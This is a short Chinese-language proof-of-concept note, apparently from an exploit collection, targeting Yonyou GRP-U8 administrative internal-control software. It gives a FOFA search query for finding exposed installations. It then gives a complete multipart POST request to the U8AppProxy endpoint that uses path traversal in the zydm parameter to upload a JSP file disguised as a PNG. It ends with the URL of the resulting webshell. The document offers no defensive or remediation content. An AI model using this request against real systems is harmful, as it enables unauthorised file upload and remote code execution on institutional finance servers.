## 资产收集：
fofa：title="用友GRP-U8行政事业内控管理软件"
![](img/GRP-U8.png)
## POC：
```
POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hello_U8 HTTP/1.1
Host: x.x.x.x
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Connection: close
Content-Length: 2781

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/png

<% out.println("0xold");%>
--59229605f98b8cf290a7b8908b34616b--
```
webshell链接地址：`http://x.x.x.x/hello_U8.jsp`
![](img/GRP-U8_POC.png)